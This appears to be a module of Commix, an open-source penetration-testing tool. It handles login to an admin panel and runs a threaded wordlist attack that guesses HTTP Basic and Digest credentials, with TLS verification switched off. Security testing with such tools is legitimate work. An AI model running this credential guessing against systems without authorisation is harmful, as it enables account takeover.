#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
try:
  import concurrent.futures
  _THREADS_SUPPORTED = True
except ImportError:
  # "concurrent.futures" needs Python 3.2+; fall back to serial on Python 2.
  _THREADS_SUPPORTED = False
from src.core.parse import cmdline as menu
from src.utils import settings
from src.utils import session_handler
from src.core.requests import headers
from src.core.requests import redirection
from src.utils import common
from src.core.controller import checks
from src.thirdparty.colorama import Style
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import http_cookiejar as _http_cookiejar

"""
If a dashboard or an administration panel is found (auth_url),
do the authentication process using the provided credentials (auth_data).
"""

"""
The authentication process
"""
def authentication_process(http_request_method):
  if not menu.options.auth_data:
    err_msg = "The '--auth-url' option requires you to also provide the '--auth-data' option."
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

  try:
    auth_url = menu.options.auth_url
    auth_data = menu.options.auth_data
    cj = _http_cookiejar.CookieJar()
    opener = _urllib.request.build_opener(_urllib.request.HTTPCookieProcessor(cj), redirection.RedirectHandler(), _urllib.request.HTTPSHandler(context=settings.unverified_context()))
    _urllib.request.install_opener(opener)
    # Login data is always form-submitted as POST, regardless of the target URL's own method.
    request = _urllib.request.Request(auth_url, auth_data.encode(settings.DEFAULT_CODEC), method=settings.HTTPMETHOD.POST)
    # Check if defined extra headers.
    headers.do_check(request)
    response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
    # HTTPCookieProcessor only fills the jar after the response is received.
    cookies = ""
    for cookie in cj:
        cookie_values = cookie.name + "=" + cookie.value + "; "
        cookies += cookie_values
    if len(cookies) != 0 :
      menu.options.cookie = cookies.rstrip()
      if settings.VERBOSITY_LEVEL != 0:
        info_msg = "The received cookie is "
        info_msg += str(menu.options.cookie) + Style.RESET_ALL + "."
        settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
    return response

  except Exception as err_msg:
    checks.connection_exceptions(err_msg)

"""
HTTP auth wordlists for usernames and passwords
"""
def define_wordlists():

  while True:
    message = "Do you want to use default wordlists for dictionary-based attack? [Y/n] "
    do_update = common.read_input(message, default="Y", check_batch=True)
    
    if do_update in settings.CHOICE_YES:
      # Load default wordlists
      usernames = common.load_list_from_file(settings.USERNAMES_TXT_FILE, "usernames wordlist")
      passwords = common.load_list_from_file(settings.PASSWORDS_TXT_FILE, "passwords wordlist")
      info_msg = "Using default wordlists for dictionary-based authentication check."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      break

    elif do_update in settings.CHOICE_NO:
      # Load custom wordlists
      username_txt_file = common.read_input("Please enter usernames wordlist > ", default=None, check_batch=True)
      passwords_txt_file = common.read_input("Please enter passwords wordlist > ", default=None, check_batch=True)
      usernames = common.load_list_from_file(username_txt_file, "usernames wordlist")
      passwords = common.load_list_from_file(passwords_txt_file, "passwords wordlist")
      break

    elif do_update in settings.CHOICE_QUIT:
      raise SystemExit()

    else:
      common.invalid_option(do_update)

  return usernames, passwords

"""
Try one (username, password) pair; True on success. Uses its own opener, not the global one.
"""
def _try_credentials(url, realm, http_request_method, authentication_type, username, password):
  try:
    if authentication_type.lower() == settings.AUTH_TYPE.BASIC:
      authhandler = _urllib.request.HTTPBasicAuthHandler()
    else:
      authhandler = _urllib.request.HTTPDigestAuthHandler()
    authhandler.add_password(realm, url, username, password)
    request = _urllib.request.Request(url, method=http_request_method)
    if menu.options.ignore_proxy:
      opener = _urllib.request.build_opener(_urllib.request.ProxyHandler({}), authhandler, redirection.RedirectHandler(), _urllib.request.HTTPSHandler(context=settings.unverified_context()))
    elif menu.options.tor:
      opener = _urllib.request.build_opener(_urllib.request.ProxyHandler({settings.SCHEME: menu.options.proxy}), authhandler, redirection.RedirectHandler(), _urllib.request.HTTPSHandler(context=settings.unverified_context()))
    else:
      if menu.options.proxy:
        request.set_proxy(menu.options.proxy, settings.SCHEME)
      opener = _urllib.request.build_opener(authhandler, redirection.RedirectHandler(), _urllib.request.HTTPSHandler(context=settings.unverified_context()))
    headers.do_check(request)
    response = opener.open(request, timeout=settings.TIMEOUT)
    response.close()
    return True
  except KeyboardInterrupt:
    raise
  except (Exception, SystemExit):
    return False

"""
Simple Basic / Digest HTTP authentication cracker.
"""
def http_auth_cracker(url, realm, http_request_method):
    settings.PERFORM_CRACKING = True
    # Define the HTTP authentication type.
    authentication_type = menu.options.auth_type
    if authentication_type.lower() not in (settings.AUTH_TYPE.BASIC, settings.AUTH_TYPE.DIGEST):
      err_msg = "Dictionary-based cracking is not supported for the '" + authentication_type + "' HTTP authentication type."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      return False
    # Define the authentication wordlists for usernames / passwords.
    usernames, passwords = define_wordlists()
    pairs = [(u, p) for u in usernames for p in passwords]
    total = len(pairs)
    completed = 0
    last_bucket = -1
    found_pair = None

    # Count one attempt off, and say how far the guessing has got.
    def report(username, password, succeeded):
      nonlocal completed, last_bucket
      completed += 1
      if settings.VERBOSITY_LEVEL != 0:
        payload = "'" + username + ":" + password + "'"
        if settings.VERBOSITY_LEVEL >= 2:
          settings.print_data_to_stdout(settings.print_checking_msg(payload))
        else:
          settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_checking_msg(payload) + settings.SINGLE_WHITESPACE * len(payload))
        return
      # A "." per 4%-wide bucket, then " (done)" - same progress style as the injection techniques.
      if not settings.PROGRESS_LINE_OPEN:
        info_msg = "Testing for valid HTTP authentication credentials."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      if succeeded or completed == total:
        settings.print_data_to_stdout(" (done)")
        return
      bucket = int(((completed * 100) / total) // 4)
      if bucket != last_bucket:
        last_bucket = bucket
        settings.print_data_to_stdout(".")

    fan_out = settings.THREADS if (settings.THREADS > 1 and _THREADS_SUPPORTED) else 1
    try:
      if fan_out > 1:
        with concurrent.futures.ThreadPoolExecutor(max_workers=fan_out) as executor:
          for batch_start in range(0, total, fan_out):
            if found_pair:
              break
            batch = pairs[batch_start:batch_start + fan_out]
            future_to_pair = dict((executor.submit(_try_credentials, url, realm, http_request_method, authentication_type, u, p), (u, p)) for u, p in batch)
            for future in concurrent.futures.as_completed(future_to_pair):
              username, password = future_to_pair[future]
              succeeded = future.result()
              report(username, password, succeeded)
              if succeeded and not found_pair:
                found_pair = (username, password)
      else:
        for username, password in pairs:
          succeeded = _try_credentials(url, realm, http_request_method, authentication_type, username, password)
          report(username, password, succeeded)
          if succeeded:
            found_pair = (username, password)
            break
    except KeyboardInterrupt:
      raise

    settings.PERFORM_CRACKING = False
    if found_pair:
      username, password = found_pair
      if not settings.LOAD_SESSION:
        session_handler.import_valid_credentials(url, authentication_type, url, username, password)
      valid_pair = "" + username + ":" + password + ""
      if not settings.VERBOSITY_LEVEL >= 2:
        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      info_msg = "Authentication succeeded using credentials: '" + valid_pair + "'."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      return valid_pair

    err_msg = "Use the '--auth-cred' option to provide a valid pair of "
    err_msg += "HTTP authentication credentials (i.e. '--auth-cred=admin:admin') "
    err_msg += "or place another dictionary in the '"
    err_msg += os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/' directory."
    settings.print_data_to_stdout(settings.END_LINE.LF + settings.print_critical_msg(err_msg))
    return False

# eof
